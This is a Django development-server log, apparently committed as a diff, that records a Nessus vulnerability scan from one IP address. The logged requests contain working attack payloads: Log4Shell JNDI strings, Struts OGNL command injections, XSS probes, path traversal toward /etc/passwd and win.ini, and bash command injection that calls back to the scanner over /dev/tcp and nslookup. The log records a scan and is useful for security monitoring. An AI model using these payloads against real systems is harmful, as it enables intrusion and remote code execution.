+[08/Oct/2023 04:50:25,186] - Broken pipe from ('130.253.1.147', 55176)
+
+[08/Oct/2023 04:50:25,259] - Broken pipe from ('130.253.1.147', 55178)
+
+[08/Oct/2023 04:50:25] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:25] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:26] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:26] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:26,654] - Broken pipe from ('130.253.1.147', 55486)
+
+[08/Oct/2023 04:50:26] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:27,187] - Broken pipe from ('130.253.1.147', 55524)
+
+[08/Oct/2023 04:50:27] "GET / HTTP/1.1" 200 35341
+Not Found: /pluto/portal/
+[08/Oct/2023 04:50:27] "GET /pluto/portal/ HTTP/1.1" 404 5322
+[08/Oct/2023 04:50:27,905] - Broken pipe from ('130.253.1.147', 55892)
+
+Not Found: /nifi/
+[08/Oct/2023 04:50:28] "GET /nifi/ HTTP/1.1" 404 5298
+[08/Oct/2023 04:50:28] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:28,812] - Broken pipe from ('130.253.1.147', 56042)
+
+[08/Oct/2023 04:50:29] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:29] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:29] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:35] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:40] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:41,275] - Broken pipe from ('130.253.1.147', 56458)
+
+[08/Oct/2023 04:50:41] "GET / HTTP/1.1" 200 35341
+Invalid HTTP_HOST header: '${jndi:ldap://130.253.1.147:58443/nessus}:17778'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[08/Oct/2023 04:50:42] "GET / HTTP/1.1" 400 17292
+[08/Oct/2023 04:50:43] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:46,027] - Broken pipe from ('130.253.1.147', 59990)
+
+[08/Oct/2023 04:50:46] "GET / HTTP/1.1" 200 35341
+Not Found: /unified-console.html
+[08/Oct/2023 04:50:46] "GET /unified-console.html HTTP/1.1" 404 5343
+[08/Oct/2023 04:50:46,882] - Broken pipe from ('130.253.1.147', 60538)
+
+[08/Oct/2023 04:50:47] "GET / HTTP/1.1" 200 35341
+Not Found: /login/
+[08/Oct/2023 04:50:47] "GET /login/ HTTP/1.1" 404 5301
+[08/Oct/2023 04:50:48] "GET /admin/airflow/login HTTP/1.1" 302 0
+[08/Oct/2023 04:50:48,549] - Broken pipe from ('130.253.1.147', 60836)
+
+[08/Oct/2023 04:50:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:49,280] - Broken pipe from ('130.253.1.147', 59370)
+
+Not Found: /api/v1/
+[08/Oct/2023 04:50:49] "GET /api/v1/?format=api HTTP/1.1" 404 5315
+[08/Oct/2023 04:50:49] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:50,062] - Broken pipe from ('130.253.1.147', 33042)
+
+Not Found: /api/v1/
+[08/Oct/2023 04:50:50] "GET /api/v1/?format=api HTTP/1.1" 404 5315
+[08/Oct/2023 04:50:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:50,663] - Broken pipe from ('130.253.1.147', 33232)
+
+[08/Oct/2023 04:50:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:51,029] - Broken pipe from ('130.253.1.147', 56212)
+
+Not Found: /libs/granite/core/content/login.html
+[08/Oct/2023 04:50:51] "GET /libs/granite/core/content/login.html HTTP/1.1" 404 5391
+[08/Oct/2023 04:50:51] "GET / HTTP/1.1" 200 35341
+Not Found: /system/login
+[08/Oct/2023 04:50:51] "GET /system/login HTTP/1.1" 404 5319
+[08/Oct/2023 04:50:51,644] - Broken pipe from ('130.253.1.147', 33470)
+
+[08/Oct/2023 04:50:51,803] - Broken pipe from ('130.253.1.147', 33568)
+
+[08/Oct/2023 04:50:51] "GET / HTTP/1.1" 200 35341
+Not Found: /system/login
+[08/Oct/2023 04:50:51] "GET /system/login HTTP/1.1" 404 5319
+[08/Oct/2023 04:50:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:52,389] - Broken pipe from ('130.253.1.147', 33646)
+
+Not Found: /servlet/admin
+[08/Oct/2023 04:50:52] "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 5583
+Not Found: /courier/web/1000@/wmLogin.html
+[08/Oct/2023 04:50:52] "GET /courier/web/1000@/wmLogin.html HTTP/1.1" 404 5373
+Not Found: /chassis/config/GeneralChassisConfig.html
+[08/Oct/2023 04:50:52] "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 5397
+[08/Oct/2023 04:50:52,956] - Broken pipe from ('130.253.1.147', 33876)
+
+[08/Oct/2023 04:50:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:54] "GET / HTTP/1.1" 200 35341
+Not Found: /qwe/qwe/index.html
+[08/Oct/2023 04:50:54] "GET /qwe/qwe/index.html HTTP/1.1" 404 5337
+[08/Oct/2023 04:50:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:54,652] - Broken pipe from ('130.253.1.147', 34322)
+
+[08/Oct/2023 04:50:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:55,975] - Broken pipe from ('130.253.1.147', 34326)
+
+[08/Oct/2023 04:50:56,318] - Broken pipe from ('130.253.1.147', 34548)
+
+[08/Oct/2023 04:51:00] "GET / HTTP/1.1" 200 35341
+Not Found: /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec('ping -c 3 -p 327663505741344d4c63 130.253.1.147'))}/
+[08/Oct/2023 04:51:02] "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20327663505741344d4c63%20130.253.1.147%27%29%29%7D// HTTP/1.1" 404 3154
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:51:04] "POST / HTTP/1.1" 403 2870
+Not Found: /(#mem=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]):index.xhtml
+[08/Oct/2023 04:51:05] "GET //(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]):index.xhtml?cmd=ping%20%2dc%203%20%2dp%20636e376f48374c5f7558%20130.253.1.147 HTTP/1.1" 404 5748
+[08/Oct/2023 04:51:12,583] - Broken pipe from ('130.253.1.147', 37084)
+
+Not Found: /${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('ping -c 3 -p 327663505741344d4c63 130.253.1.147').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new  java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#sbtest.println(#d),#sbtest.close())}/
+[08/Oct/2023 04:51:12] "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20327663505741344d4c63%20130.253.1.147%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 2997
+[08/Oct/2023 04:51:14,161] - Broken pipe from ('130.253.1.147', 37544)
+
+[08/Oct/2023 04:51:15,441] - Broken pipe from ('130.253.1.147', 37862)
+
+[08/Oct/2023 04:51:19] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:20] "GET /?tag=tenable-892969180&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:20,926] - Broken pipe from ('130.253.1.147', 41310)
+
+[08/Oct/2023 04:51:21] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:22] "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:22,743] - Broken pipe from ('130.253.1.147', 39766)
+
+[08/Oct/2023 04:51:22] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:23] "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201696740683%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 200 35341
+Not Found: /${{57550614+16044095}}/
+[08/Oct/2023 04:51:23] "GET %24%7B%7B57550614+16044095%7D%7D// HTTP/1.1" 404 1835
+[08/Oct/2023 04:51:24] "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p46536945387a4c4c6f66%20130.253.1.147%27%29.getInputStream%28%29%29%7d HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:24,652] - Broken pipe from ('130.253.1.147', 42200)
+
+[08/Oct/2023 04:51:25] "GET / HTTP/1.1" 200 35341
+Not Found: /${#context['xwork.MethodAccessor.denyMethodExecution']=!(#_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('id').waitFor()}.action
+[08/Oct/2023 04:51:26] "GET //${%23context['xwork.MethodAccessor.denyMethodExecution']=!(%23_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('id').waitFor()}.action HTTP/1.1" 404 5894
+[08/Oct/2023 04:51:26,821] - Broken pipe from ('130.253.1.147', 42720)
+
+[08/Oct/2023 04:51:27] "GET / HTTP/1.1" 200 35341
+Not Found: /flex2gateway/http
+[08/Oct/2023 04:51:27] "POST /flex2gateway/http HTTP/1.1" 404 5335
+Not Found: /messagebroker/http
+[08/Oct/2023 04:51:28] "POST /messagebroker/http HTTP/1.1" 404 5338
+[08/Oct/2023 04:51:29,471] - Broken pipe from ('130.253.1.147', 42528)
+
+[08/Oct/2023 04:51:29] "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 200 35341
+Not Found: /blazeds/messagebroker/http
+[08/Oct/2023 04:51:30] "POST /blazeds/messagebroker/http HTTP/1.1" 404 5362
+[08/Oct/2023 04:51:30,457] - Broken pipe from ('130.253.1.147', 41788)
+
+[08/Oct/2023 04:51:31] "GET / HTTP/1.1" 200 35341
+Not Found: /lcds/messagebroker/http
+[08/Oct/2023 04:51:31] "POST /lcds/messagebroker/http HTTP/1.1" 404 5353
+[08/Oct/2023 04:51:32,479] - Broken pipe from ('130.253.1.147', 43240)
+
+Not Found: /item.fts
+[08/Oct/2023 04:51:32] "GET /item.fts?href=%22%3E%3Cscript%3Ealert(%22ftgate_44002.nasl%22)%3C%2Fscript%3E%3B HTTP/1.1" 404 5379
+[08/Oct/2023 04:51:33] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:33,729] - Broken pipe from ('130.253.1.147', 44188)
+
+[08/Oct/2023 04:51:34] "GET / HTTP/1.1" 200 35341
+Not Found: /altercast/AlterCast
+[08/Oct/2023 04:51:34] "GET /altercast/AlterCast?op=%3cscript%3ealert(%22adobe_document_server_61.nasl%22)%3c%2fscript%3e HTTP/1.1" 404 5413
+[08/Oct/2023 04:51:35,560] - Broken pipe from ('130.253.1.147', 44564)
+
+Not Found: /nul.dbm
+[08/Oct/2023 04:51:35] "GET /nul.dbm HTTP/1.1" 404 5304
+[08/Oct/2023 04:51:39,178] - Broken pipe from ('130.253.1.147', 44778)
+
+[08/Oct/2023 04:51:40] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:40] "GET / HTTP/1.1" 200 35341
+Not Found: /getfile
+[08/Oct/2023 04:51:42] "GET /getfile?key=/dummy.file HTTP/1.1" 404 5320
+Not Found: /mxhelp/cgi-bin/namazucgi
+[08/Oct/2023 04:51:42] "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 5409
+[08/Oct/2023 04:51:43,556] - Broken pipe from ('130.253.1.147', 46312)
+
+[08/Oct/2023 04:51:43,729] - Broken pipe from ('130.253.1.147', 46306)
+
+[08/Oct/2023 04:51:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:44] "GET / HTTP/1.1" 200 35341
+Not Found: /index.jsp
+[08/Oct/2023 04:51:45] "GET /index.jsp HTTP/1.1" 404 5310
+Not Found: /web.config
+[08/Oct/2023 04:51:45] "GET /web.config HTTP/1.1" 404 5313
+[08/Oct/2023 04:51:47,180] - Broken pipe from ('130.253.1.147', 47062)
+
+Not Found: /index.jsp
+[08/Oct/2023 04:51:47] "GET /index.jsp HTTP/1.1" 404 5326
+Not Found: /scripts/w3who.dll
+[08/Oct/2023 04:51:47] "GET /scripts/w3who.dll HTTP/1.1" 404 5328
+[08/Oct/2023 04:51:48,072] - Broken pipe from ('130.253.1.147', 47060)
+
+[08/Oct/2023 04:51:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:48] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/filescan
+[08/Oct/2023 04:51:49] "GET /cgi-bin/filescan HTTP/1.1" 404 5331
+Not Found: /struts/webconsole.html
+[08/Oct/2023 04:51:49] "GET /struts/webconsole.html HTTP/1.1" 404 5349
+[08/Oct/2023 04:51:49,844] - Broken pipe from ('130.253.1.147', 48090)
+
+[08/Oct/2023 04:51:50,075] - Broken pipe from ('130.253.1.147', 48128)
+
+[08/Oct/2023 04:51:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:51] "GET / HTTP/1.1" 200 35341
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:51:51] "POST / HTTP/1.1" 403 2870
+[08/Oct/2023 04:51:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:52,968] - Broken pipe from ('130.253.1.147', 48558)
+
+[08/Oct/2023 04:51:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:53,823] - Broken pipe from ('130.253.1.147', 48516)
+
+[08/Oct/2023 04:51:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:54] "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1696740711 HTTP/1.1" 200 35341
+Not Found: /${556423726+5}.action
+[08/Oct/2023 04:51:55] "GET //${556423726+5}.action HTTP/1.1" 404 5350
+Not Found: /struts/webconsole.html
+[08/Oct/2023 04:51:55] "GET //struts/webconsole.html HTTP/1.1" 404 5349
+[08/Oct/2023 04:51:55,814] - Broken pipe from ('130.253.1.147', 48918)
+
+Not Found: /${#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.print('Nessus Response: '),#w.println('struts_2_3_14_3_command_execution-556423726'),#w.flush(),#w.close()}.action
+[08/Oct/2023 04:51:56] "GET //${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.print('Nessus%20Response:%20'),%23w.println('struts_2_3_14_3_command_execution-556423726'),%23w.flush(),%23w.close()}.action HTTP/1.1" 404 6010
+[08/Oct/2023 04:51:56] code 400, message Bad request syntax ('\x16\x03\x01\x00¿\x01\x00\x00»\x03\x01d£\x83H¯.¦PQhgJ[\x9cÍ\x84<P\x01\x88ÛûÈ\x93êÅ$/à\x8a°E\x00\x00RÀ')
+[08/Oct/2023 04:51:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:51:56,566] - Broken pipe from ('130.253.1.147', 49402)
+
+[08/Oct/2023 04:51:56,715] - Broken pipe from ('130.253.1.147', 49252)
+
+[08/Oct/2023 04:51:56] "GET / HTTP/1.1" 200 35341
+Not Found: /.anydomain.test
+[08/Oct/2023 04:51:56] "GET /.anydomain.test HTTP/1.0" 404 5328
+[08/Oct/2023 04:51:57] "GET / HTTP/1.1" 200 35341
+Not Found: /xsql/demo/airport/airport.xsql
+[08/Oct/2023 04:51:58] "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 404 5387
+[08/Oct/2023 04:51:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:58] "GET / HTTP/1.1" 200 35341
+Not Found: /javax.faces.resource/dynamiccontent.properties.xhtml
+[08/Oct/2023 04:51:58] "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 5440
+[08/Oct/2023 04:51:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:51:59,754] - Broken pipe from ('130.253.1.147', 50092)
+
+[08/Oct/2023 04:51:59,814] - Broken pipe from ('130.253.1.147', 50166)
+
+[08/Oct/2023 04:52:00] "GET / HTTP/1.1" 200 35341
+Not Found: /OvCgi/freeIPaddrs.ovpl
+[08/Oct/2023 04:52:00] "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 5426
+Not Found: /././..
+[08/Oct/2023 04:52:00] "GET /././.. HTTP/1.1" 404 5289
+Not Found: /setup/setup-/../../log.jsp
+[08/Oct/2023 04:52:00] "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 5377
+[08/Oct/2023 04:52:00,681] - Broken pipe from ('130.253.1.147', 50526)
+
+Not Found: /../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../
+[08/Oct/2023 04:52:00] "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 404 2182
+Not Found: /api/getServices
+[08/Oct/2023 04:52:01] "GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-R92xszdwpz5RZHboX5ewten.w.nessus.org) HTTP/1.1" 404 5424
+[08/Oct/2023 04:52:01,355] - Broken pipe from ('130.253.1.147', 50762)
+
+[08/Oct/2023 04:52:01] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:01] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:02] "GET / HTTP/1.1" 200 35341
+Not Found: /version
+[08/Oct/2023 04:52:02] "GET /version HTTP/1.1" 404 5304
+Not Found: /.%2e/.%2e/.%2e/.%2e/windows/win.ini
+[08/Oct/2023 04:52:02] "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 5396
+[08/Oct/2023 04:52:03,404] - Broken pipe from ('130.253.1.147', 51150)
+
+Not Found: /search
+[08/Oct/2023 04:52:03] "GET /search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 5370
+Not Found: /.%2e/.%2e/.%2e/.%2e/winnt/win.ini
+[08/Oct/2023 04:52:03] "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 5390
+[08/Oct/2023 04:52:03] "GET / HTTP/1.1" 200 35341
+Not Found: /search
+[08/Oct/2023 04:52:04] "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 404 5352
+Not Found: /.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
+[08/Oct/2023 04:52:04] "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 5432
+Not Found: /ifx/
+[08/Oct/2023 04:52:05] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 5324
+[08/Oct/2023 04:52:05,809] - Broken pipe from ('130.253.1.147', 51470)
+
+[08/Oct/2023 04:52:05,877] - Broken pipe from ('130.253.1.147', 51274)
+
+[08/Oct/2023 04:52:06] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:06] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:06,239] - Broken pipe from ('130.253.1.147', 51920)
+
+[08/Oct/2023 04:52:06] "GET / HTTP/1.1" 200 35341
+Not Found: /api/getServices
+[08/Oct/2023 04:52:07] "GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_PORT[17778]by_nessus%20%3E/dev/tcp/130.253.1.147/41823") HTTP/1.1" 404 5428
+Not Found: /status.xsl.
+Not Found: /jR2LeWhMWIPW
+[08/Oct/2023 04:52:08] "GET /status.xsl. HTTP/1.1" 404 5316
+[08/Oct/2023 04:52:08] "GET /jR2LeWhMWIPW HTTP/1.1" 404 5319
+Not Found: /vendor/htmlawed/htmlawed/htmLawedTest.php
+[08/Oct/2023 04:52:08] "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 5407
+[08/Oct/2023 04:52:09,237] - Broken pipe from ('130.253.1.147', 52506)
+
+Not Found: /jR2LeWhMWIPW
+[08/Oct/2023 04:52:09] "PUT /jR2LeWhMWIPW HTTP/1.1" 404 5319
+Not Found: /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php
+[08/Oct/2023 04:52:09] "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 5422
+[08/Oct/2023 04:52:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:10,851] - Broken pipe from ('130.253.1.147', 52628)
+
+Not Found: /jR2LeWhMWIPW
+[08/Oct/2023 04:52:10] "GET /jR2LeWhMWIPW HTTP/1.1" 404 5319
+[08/Oct/2023 04:52:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:11,537] - Broken pipe from ('130.253.1.147', 52508)
+
+Not Found: /remote/fgt_lang
+[08/Oct/2023 04:52:11] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 5382
+Not Found: /cgi-bin/faqmanager.cgi
+[08/Oct/2023 04:52:11] "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 5362
+Not Found: /FormHandler.cgi
+[08/Oct/2023 04:52:11] "POST /FormHandler.cgi HTTP/1.1" 404 5329
+[08/Oct/2023 04:52:11,915] - Broken pipe from ('130.253.1.147', 53668)
+
+[08/Oct/2023 04:52:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:12,216] - Broken pipe from ('130.253.1.147', 53976)
+
+[08/Oct/2023 04:52:12] "GET / HTTP/1.1" 200 35341
+Not Found: /CFIDE/administrator/index.cfm
+[08/Oct/2023 04:52:12] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 5364
+[08/Oct/2023 04:52:13,318] - Broken pipe from ('130.253.1.147', 50898)
+
+Not Found: /http:/127.0.0.1/iControl/iControlPortal.cgi
+[08/Oct/2023 04:52:13] "POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 1888
+[08/Oct/2023 04:52:13] "GET / HTTP/1.1" 200 35341
+Not Found: /DB4Web/tenapp04-vlp.du.edu:23/foo
+[08/Oct/2023 04:52:13] "GET /DB4Web/tenapp04-vlp.du.edu:23/foo HTTP/1.1" 404 5382
+[08/Oct/2023 04:52:13] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:14,025] - Broken pipe from ('130.253.1.147', 54198)
+
+[08/Oct/2023 04:52:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:14,553] - Broken pipe from ('130.253.1.147', 54290)
+
+Not Found: /axis/DirectDownload.jsp
+[08/Oct/2023 04:52:14] "GET /axis/DirectDownload.jsp HTTP/1.1" 404 5352
+[08/Oct/2023 04:52:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:15,048] - Broken pipe from ('130.253.1.147', 54728)
+
+Not Found: /_mt/mt.cgi
+[08/Oct/2023 04:52:15] "GET /_mt/mt.cgi HTTP/1.1" 404 5313
+Not Found: /_mt/mt.cgi
+[08/Oct/2023 04:52:15] "GET /_mt/mt.cgi HTTP/1.1" 404 5313
+Not Found: /cgi-bin/file_transfer.cgi
+[08/Oct/2023 04:52:15] "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 404 5359
+[08/Oct/2023 04:52:15] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:15,688] - Broken pipe from ('130.253.1.147', 54930)
+
+Not Found: /admin.cgi
+[08/Oct/2023 04:52:15] "GET /admin.cgi HTTP/1.1" 404 5310
+Not Found: /admin.cgi
+[08/Oct/2023 04:52:15] "GET /admin.cgi HTTP/1.1" 404 5310
+[08/Oct/2023 04:52:16] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:16] "GET / HTTP/1.1" 200 35341
+Not Found: /administrator.cgi
+[08/Oct/2023 04:52:16] "GET /administrator.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:16,235] - Broken pipe from ('130.253.1.147', 55142)
+
+Not Found: /administrator.cgi
+[08/Oct/2023 04:52:16] "GET /administrator.cgi HTTP/1.1" 404 5334
+Not Found: /note.txt
+[08/Oct/2023 04:52:16] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 5387
+Not Found: /SiteScope/cgi/go.exe/SiteScope
+[08/Oct/2023 04:52:16] "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 5439
+Not Found: /buglist.cgi
+[08/Oct/2023 04:52:16] "GET /buglist.cgi HTTP/1.1" 404 5316
+Not Found: /buglist.cgi
+[08/Oct/2023 04:52:16] "GET /buglist.cgi HTTP/1.1" 404 5316
+Not Found: /note.txt
+[08/Oct/2023 04:52:16] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 5385
+Not Found: /..\pixfir~1\how_to_login.html
+[08/Oct/2023 04:52:16] "GET /..\pixfir~1\how_to_login.html HTTP/1.1" 404 5368
+Not Found: /cgi/mid.cgi
+[08/Oct/2023 04:52:17] "GET /cgi/mid.cgi HTTP/1.1" 404 5316
+Not Found: /cgi/mid.cgi
+[08/Oct/2023 04:52:17] "GET /cgi/mid.cgi HTTP/1.1" 404 5316
+[08/Oct/2023 04:52:18,242] - Broken pipe from ('130.253.1.147', 55318)
+
+Not Found: /trace.axd
+[08/Oct/2023 04:52:18] "GET /trace.axd HTTP/1.1" 404 5304
+Not Found: /global.asa
+[08/Oct/2023 04:52:18] "GET /global.asa HTTP/1.1" 404 5307
+Not Found: /cgi-bin/admin
+[08/Oct/2023 04:52:19] "GET /cgi-bin/admin HTTP/1.1" 404 5322
+Not Found: /cgi-bin/admin
+[08/Oct/2023 04:52:19] "GET /cgi-bin/admin HTTP/1.1" 404 5322
+[08/Oct/2023 04:52:20] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:52:20] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/admin.cgi
